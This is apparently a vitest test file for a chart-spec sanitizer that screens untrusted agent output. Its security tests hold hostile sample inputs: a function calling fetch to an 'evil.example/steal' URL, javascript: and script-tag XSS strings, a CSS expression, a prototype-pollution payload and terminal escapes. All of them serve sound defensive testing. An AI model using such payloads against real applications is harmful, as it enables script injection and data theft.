/**
 * ChartSpec sanitizer tests (§102).
 *
 * The adversarial cases matter more than the happy path: this is the boundary where
 * untrusted agent output becomes something a renderer will trust.
 */

import { describe, expect, it } from 'vitest'
import { LIMITS, formatSpecValue, sanitizeChartSpec } from '@/charts/sanitizeChartSpec'
import type { ChartSpec } from '@/types/charts'

const validLine: ChartSpec = {
  kind: 'line',
  title: '近 7 日 GMV',
  categories: ['周一', '周二', '周三'],
  series: [{ name: 'GMV', data: [100, 250, 175] }],
  money: true,
  value_unit: '元',
}

describe('sanitizeChartSpec — happy path', () => {
  it('accepts a valid spec and rebuilds it as plain data', () => {
    const result = sanitizeChartSpec(validLine)
    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect(result.spec).toEqual(validLine)
    expect(result.spec).not.toBe(validLine)
    expect(result.warnings).toEqual([])
  })

  it('keeps a safe colour and drops an unsafe one', () => {
    const result = sanitizeChartSpec({
      kind: 'bar',
      categories: ['a'],
      series: [
        { name: 'ok', data: [1], color: '#2563eb' },
        { name: 'bad', data: [2], color: 'expression(alert(1))' },
      ],
    })
    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect(result.spec.series[0]?.color).toBe('#2563eb')
    expect(result.spec.series[1]?.color).toBeUndefined()
  })

  it('accepts a CSS variable colour token (design-token theming)', () => {
    const result = sanitizeChartSpec({
      kind: 'bar',
      categories: ['a'],
      series: [{ name: 's', data: [1], color: 'var(--nx-chart-1)' }],
    })
    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect(result.spec.series[0]?.color).toBe('var(--nx-chart-1)')
  })
})

describe('sanitizeChartSpec — fail closed', () => {
  it('rejects an unknown chart kind instead of guessing', () => {
    const result = sanitizeChartSpec({ kind: 'iframe', categories: ['a'], series: [{ name: 's', data: [1] }] })
    expect(result.ok).toBe(false)
    if (result.ok) return
    expect(result.reason).toContain('未知的图表类型')
  })

  it('rejects a missing kind', () => {
    const result = sanitizeChartSpec({ series: [{ name: 's', data: [1] }] })
    expect(result.ok).toBe(false)
  })

  it('rejects non-objects and arrays', () => {
    expect(sanitizeChartSpec('<script>alert(1)</script>').ok).toBe(false)
    expect(sanitizeChartSpec([{ kind: 'line' }]).ok).toBe(false)
    expect(sanitizeChartSpec(null).ok).toBe(false)
    expect(sanitizeChartSpec(undefined).ok).toBe(false)
  })

  it('rejects a spec with no usable series', () => {
    expect(sanitizeChartSpec({ kind: 'line', series: [] }).ok).toBe(false)
    expect(sanitizeChartSpec({ kind: 'line' }).ok).toBe(false)
    expect(sanitizeChartSpec({ kind: 'line', series: [{ name: 's' }] }).ok).toBe(false)
  })

  it('rejects a table without columns or rows', () => {
    expect(sanitizeChartSpec({ kind: 'table', rows: [{ a: 1 }] }).ok).toBe(false)
    expect(
      sanitizeChartSpec({ kind: 'table', columns: [{ key: 'a', title: 'A' }] }).ok,
    ).toBe(false)
  })
})

describe('sanitizeChartSpec — security', () => {
  it('never carries a function through, even nested in a series', () => {
    const hostile = {
      kind: 'line',
      categories: ['a', 'b'],
      series: [
        {
          name: 'exfil',
          data: [1, 2],
          formatter: () => fetch('https://evil.example/steal'),
          onClick: 'javascript:alert(1)',
        },
      ],
      tooltip: { formatter: () => 1 },
    }
    const result = sanitizeChartSpec(hostile)
    expect(result.ok).toBe(true)
    if (!result.ok) return

    // Only the whitelisted keys survive; nothing callable is present anywhere.
    expect(Object.keys(result.spec).sort()).toEqual(['categories', 'kind', 'series'])
    expect(Object.keys(result.spec.series[0] ?? {}).sort()).toEqual(['data', 'name'])
    expect(findFunction(result.spec)).toBe(false)
    // And it must be JSON-serializable, i.e. pure data.
    expect(() => JSON.stringify(result.spec)).not.toThrow()
  })

  it('drops __proto__ / constructor keys instead of assigning them (prototype pollution)', () => {
    const hostile = JSON.parse(
      '{"kind":"bar","categories":["a"],"series":[{"name":"s","data":[1]}],"__proto__":{"polluted":true},"constructor":{"prototype":{"polluted2":true}}}',
    ) as Record<string, unknown>
    const result = sanitizeChartSpec(hostile)
    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect(({} as Record<string, unknown>).polluted).toBeUndefined()
    expect(({} as Record<string, unknown>).polluted2).toBeUndefined()
    expect(Object.prototype.hasOwnProperty.call(result.spec, '__proto__')).toBe(false)
  })

  it('ignores inherited properties (only own keys are read)', () => {
    const inherited = Object.create({ kind: 'line', series: [{ name: 'x', data: [1] }] }) as unknown
    expect(sanitizeChartSpec(inherited).ok).toBe(false)
  })

  it('strips control characters that could forge log lines or terminal escapes', () => {
    const result = sanitizeChartSpec({
      kind: 'bar',
      title: 'ok\u001b[31mred\u0000',
      categories: ['a\u0007b'],
      series: [{ name: 's\u001b]0;pwn', data: [1] }],
    })
    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect(result.spec.title).not.toMatch(/[\u0000-\u001F\u007F]/)
    expect(result.spec.categories?.[0]).not.toMatch(/[\u0000-\u001F\u007F]/)
    expect(result.spec.series[0]?.name).not.toMatch(/[\u0000-\u001F\u007F]/)
  })

  it('drops NaN / Infinity so a layout cannot be broken silently', () => {
    const result = sanitizeChartSpec({
      kind: 'line',
      categories: ['a', 'b', 'c'],
      series: [{ name: 's', data: [1, Number.NaN, Number.POSITIVE_INFINITY] }],
    })
    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect(result.spec.series[0]?.data).toEqual([1])
  })

  it('caps series, categories, data points and table rows', () => {
    const manySeries = Array.from({ length: 50 }, (_v, i) => ({
      name: `s${i}`,
      data: Array.from({ length: 900 }, () => 1),
    }))
    const result = sanitizeChartSpec({
      kind: 'line',
      categories: Array.from({ length: 900 }, (_v, i) => `c${i}`),
      series: manySeries,
    })
    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect(result.spec.series.length).toBeLessThanOrEqual(LIMITS.series)
    expect(result.spec.categories?.length).toBeLessThanOrEqual(LIMITS.categories)
    expect(result.spec.series[0]?.data.length).toBeLessThanOrEqual(LIMITS.dataPointsPerSeries)

    const rows = Array.from({ length: 5000 }, (_v, i) => ({ a: i }))
    const table = sanitizeChartSpec({
      kind: 'table',
      columns: [{ key: 'a', title: 'A' }],
      rows,
    })
    expect(table.ok).toBe(true)
    if (!table.ok) return
    expect(table.spec.rows?.length).toBeLessThanOrEqual(LIMITS.tableRows)
  })

  it('truncates over-long strings instead of shipping a megabyte label', () => {
    const result = sanitizeChartSpec({
      kind: 'bar',
      title: 'x'.repeat(5000),
      categories: ['a'],
      series: [{ name: 'y'.repeat(5000), data: [1] }],
    })
    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect((result.spec.title ?? '').length).toBeLessThanOrEqual(LIMITS.stringLength + 1)
    expect((result.spec.series[0]?.name ?? '').length).toBeLessThanOrEqual(LIMITS.stringLength + 1)
  })
})

describe('sanitizeChartSpec — alignment', () => {
  it('aligns categories and data to the shorter side and explains why', () => {
    const result = sanitizeChartSpec({
      kind: 'line',
      categories: ['a', 'b', 'c'],
      series: [{ name: 's', data: [1, 2] }],
    })
    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect(result.spec.categories).toEqual(['a', 'b'])
    expect(result.warnings.join()).toContain('不一致')
  })

  it('keeps only the first series for pie and gauge', () => {
    const result = sanitizeChartSpec({
      kind: 'pie',
      categories: ['a'],
      series: [
        { name: 'first', data: [1] },
        { name: 'second', data: [2] },
      ],
    })
    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect(result.spec.series).toHaveLength(1)
    expect(result.warnings.join()).toContain('饼图')
  })

  it('renders a table preserving column order and dropping unknown keys', () => {
    const result = sanitizeChartSpec({
      kind: 'table',
      columns: [
        { key: 'sku', title: 'SKU' },
        { key: 'stock', title: '库存', align: 'right' },
      ],
      rows: [
        { sku: 'NX-1', stock: 12, secret: 'should-not-render' },
        { sku: 'NX-2', stock: null },
      ],
    })
    expect(result.ok).toBe(true)
    if (!result.ok) return
    expect(result.spec.rows?.[0]).toEqual({ sku: 'NX-1', stock: 12 })
    expect(result.spec.rows?.[1]).toEqual({ sku: 'NX-2', stock: null })
    expect(result.spec.columns?.[1]?.align).toBe('right')
  })
})

describe('formatSpecValue', () => {
  it('converts minor units for money specs without floating point drift', () => {
    // 1234 MINOR units = 12.34 major units. The renderer never divides by 100.
    expect(formatSpecValue(1234, { money: true, value_unit: '元' })).toBe('12.34元')
    expect(formatSpecValue(1, { money: true })).toBe('0.01')
    expect(formatSpecValue(0, { money: true })).toBe('0.00')
    expect(formatSpecValue(42, {})).toBe('42')
    expect(formatSpecValue(42, { value_unit: '件' })).toBe('42件')
  })
})

/** Depth-limited search for any callable value inside the sanitized output. */
function findFunction(value: unknown, depth = 0): boolean {
  if (depth > 10) return false
  if (typeof value === 'function') return true
  if (Array.isArray(value)) return value.some((item) => findFunction(item, depth + 1))
  if (value && typeof value === 'object') {
    return Object.values(value as Record<string, unknown>).some((item) =>
      findFunction(item, depth + 1),
    )
  }
  return false
}
